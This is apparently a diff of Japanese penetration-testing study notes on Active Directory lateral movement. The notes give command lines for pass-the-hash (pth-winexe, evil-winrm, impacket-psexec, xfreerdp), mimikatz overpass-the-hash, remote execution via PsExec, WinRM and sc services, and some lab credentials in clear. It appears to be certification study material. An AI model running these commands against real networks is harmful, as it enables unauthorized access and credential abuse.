@@ -1,178 +1,75 @@
-### Pass the Hash
+## Pass the Hash
 
-* Kerberos 認証では動作せず、NTLM 認証を用いたサーバやサービスでのみ動作する。
+#### pth-winexe(kaliから横展開)
 
-* ファイアウォールを介したSMB接続（通常はポート445）と、Windowsのファイルおよびプリント共有機能が有効であることが必要
+```bash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1 cmd
+```
 
-* (Metasploit, 2017), https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/ [↩︎](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/pass-the-hash#fnref1)
+### evil-winrm
 
-  (@byt3bl33d3r, 2015), https://github.com/byt3bl33d3r/pth-toolkit [↩︎](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/pass-the-hash#fnref2)
+- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- **Required Group Memberships:** Remote Management Users
 
-  (Core Security, 2017), https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py 
+```bash
+evil-winrm -i 192.168.158.57 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 
+```
 
-* 管理共有(445)が有効であることの確認（windows clientの場合)
+### impacket-psexec
 
-  ```cmd
-  net share
-  ```
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.158.57
+```
 
-* #### pth-winexe(kaliから横展開)
+### RDP
 
-  ```bash
-  └─$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1 cmd
-  E_md4hash wrapper called.
-  HASH PASS: Substituting user supplied NTLM HASH...
-  Microsoft Windows [Version 10.0.16299.15]
-  (c) 2017 Microsoft Corporation. All rights reserved.
-  
-  C:\Windows\system32>whoami
-  whoami
-  client251\administrator
-  ```
+```
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+```
 
-  https://yougottahackthat.com/blog/339/what-is-aad3b435b51404eeaad3b435b51404ee
-
-  ※Active Directoryのドメインアカウントと組み込みのローカル管理者アカウントに有効です。2014年のセキュリティアップデート7以降、この手法は他のローカル管理者アカウントとして認証するために使用することはできない
-
-* ### evil-winrm
-
-  ```
-  evil-winrm -i 192.168.158.57 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 
-  ```
-
-* ### impacket-psexec
-
-  ```
-  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.158.57
-  ```
-
-* ### RDP
-
-  ```
-  xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
-  ```
-
-  ```
-  rdesktop -g 90% -d EXAM -u ted -p avatar123 192.168.131.171
-  ```
+```
+rdesktop -g 90% -d EXAM -u ted -p avatar123 192.168.131.171
+```
 
 
 
-### Overthehash
+## Overthehash
 
-NTLM ハッシュを Kerberos チケットに変換し、NTLM 認証を使用しないようにしてTGTやTGSを取得する
+mimikatzでover the hashする
 
-* キャッシュにクレデンシャルを残す
+```cmd
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
+```
 
-  * mimikatzを起動しておく
+Kerberosチケットを確認する
 
-  * notepadを起動しキャッシュを残したいユーザで実行する
+```powershell
+PS C:\Windows\system32> klist
+Current LogonId is 0:0x186536
+Cached Tickets: (0)
+```
 
-    * notepadをoffsecで普通に開く
+ドメインコントローラ上のネットワーク共有に接続してTGTを生成する
 
-    * 上の画像のようにピンバーを右クリックし、Notepadをshift+右クリックで選択し「Run as a different User」を選択し
+```
+net use \\dc01
+klist
+```
 
-      ```
-      corp\jeff_admin
-      lab
-      ```
+TGTとTGSが登録される
 
-      でnotepadを開く
+PsExecで横展開する
 
-    * mimikatzでクレデンシャルをダンプする
-
-      ```
-      sekurlsa::logonpasswords
-      ```
-
-* mimikatzでover the hashする
-
-  powershellを起動する
-
-  ```
-  sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
-  ```
-
-* Kerberosチケットを確認する（この時点ではなし）
-
-  ```powershell
-  PS C:\Windows\system32> klist
-  Current LogonId is 0:0x186536
-  Cached Tickets: (0)
-  ```
-
-* ドメインコントローラ上のネットワーク共有に接続してTGTを生成する
-
-  （TGTを生成するコマンドであれば任意だが、ここではネットワーク共有への接続を紹介していた）
-
-  ```
-  net use \\dc01
-  klist
-  ```
-
-  TGTとTGSが登録される
-
-* PsExecで横展開する
-
-  ※PsExecはリモートでコマンドを実行できるが、パスワードハッシュを受け入れない
-
-  ```powershell
-  .\PsExec.exe \\dc01 cmd.exe
-  ipconfig
-  whoami
-  ```
+```powershell
+PsExec.exe \\dc01 cmd.exe
+```
 
 
 ※Over the HashもAdmin$という特別な管理者共有へのアクセスが必要なため、ターゲットマシンのローカル管理者権限が必要となる
 
 
 
-### Pass the Ticket
-
-TGT は作成されたマシンでしか使用できないが、TGS はネットワーク上の他の場所にエクスポートして再投入し、特定のサービスへの認証に使用することができる
-
-サービスアカウントのパスワードを利用してサービスチケットを偽造する→シルバーチケット
-
-サービスプリンシパル名が複数のサーバで使用されている場合、シルバーチケットはそれら全てに対して活用することが可能
-
-#### SID構造
-
-```
-S-R-I-S
-```
-
-R：リビジョンレベル（通常 "1 "に設定）
-
-I：識別子-権限値（AD内では "5 "が多い）
-
-S：サブ権限値
-
-```
-S-1-5-21-2536614405-3629634762-1218571035-1116
-```
-
-サブ権限の値は
-
-* ドメインの数値識別子：21-2536614405-3629634762-1218571035
-* ドメイン内の特定のオブジェクトを表す相対識別子：1116
-
-に分かれる
-
-#### SIDの取得
-
-```cmd
-whoami /user
-
----
-C:\Windows\system32>whoami /user
-
-USER INFORMATION
-----------------
-
-User Name   SID
-=========== ==============================================
-corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
-```
+## Pass the Ticket
 
 #### サービスアカウントのパスワードハッシュの取得
 
@@ -299,6 +196,14 @@ API である DCOM サービスコントロールマネージャを呼び出す�
 
 ### パスワードでの横展開（windows clientから）
 
+### RDP(port 3389)
+
+```cmd
+rdesktop -g 90% -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122
+```
+
+
+
 #### PsExec
 
 * Ports: 445/TCP(SMB)
@@ -312,8 +217,6 @@ API である DCOM サービスコントロールマネージャを呼び出す�
 
 - **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - **Required Group Memberships:** Remote Management Users
-
-Powershellコマンドをリモートホストに送るためのツール。Windowsにデフォルトでダウンロードされていることが多い。
 
 ```
 winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
@@ -340,7 +243,7 @@ Enter-PSSession -Computername TARGET -Credential $credential
 Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 ```
 
-#### 
+
 
 #### Remotely Creating Services Using sc
 
@@ -377,6 +280,8 @@ sc.exe \\TARGET start THMservice
 sc.exe \\TARGET stop THMservice
 sc.exe \\TARGET delete THMservice
 ```
+
+
 
 #### Creating Scheduled Tasks Remotely
 
